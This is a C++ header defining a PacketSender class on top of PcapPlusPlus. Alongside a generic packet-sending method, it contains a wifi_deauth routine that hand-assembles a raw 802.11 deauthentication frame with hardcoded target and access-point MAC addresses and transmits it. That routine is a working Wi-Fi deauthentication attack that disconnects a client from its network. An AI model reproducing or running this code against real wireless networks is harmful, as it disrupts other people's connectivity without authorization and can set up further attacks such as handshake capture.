#ifndef PACKET_SENDER_HPP_
#define PACKET_SENDER_HPP_

#include <EthLayer.h>
#include <UdpLayer.h>

/// @brief Class for sending packets over the device_ field
class PacketSender {
    /// @brief Device for sending
    PcapLiveDevice* device_;
    public:
    /// @brief Constructor - device must be valid
    /// @param device PcapLiveDevice* to be used for sending
    PacketSender(PcapLiveDevice* device) : device_(device) {};
    /// @brief Simple packet sending
    /// @param packet packet to be send
    /// @param count (default=1) number of packets to be sent
    void send_packet(Packet* packet, unsigned int count = 1) {
        if (device_->open()) {
            for (;count !=0; --count)
                device_->sendPacket(packet);
            std::cout << "Packets sent!" << std::endl;
        }
        else 
            std::cout << "ERROR" << std::endl;
    };
    /// @brief 
    void wifi_deauth() {
        uint8_t deauthPacket[26] = {
        /*  0 - 1  */ 0xC0, 0x00,                         // type, subtype c0: deauth (a0: disassociate)
        /*  2 - 3  */ 0x00, 0x00,                         // duration (SDK takes care of that)
        /*  4 - 9  */ 0x92, 0x15, 0x55, 0x99, 0x39, 0x3C, // reciever (target)
        /* 10 - 15 */ 0xE0, 0x19, 0x54, 0x40, 0xB0, 0xA6, // source (ap)
        /* 16 - 21 */ 0xE0, 0x19, 0x54, 0x40, 0xB0, 0xA6, // BSSID (ap)
        /* 22 - 23 */ 0x00, 0x00,                         // fragment & squence number
        /* 24 - 25 */ 0x01, 0x00                          // reason code (1 = unspecified reason)
        };
        RawPacket p1{deauthPacket,26,timespec(),false};
        ///Packet p{deauthPacket,26};
        if (device_->open()) {
            std::cout << "Attempting to send deauth packet" << std::endl;
            //device_->sendPacket(&p1);
            device_->sendPacket(p1);
            std::cout << "Packet sent" << std::endl;
        }
        else 
            std::cout << "ERROR" << std::endl;
    }
};

#endif 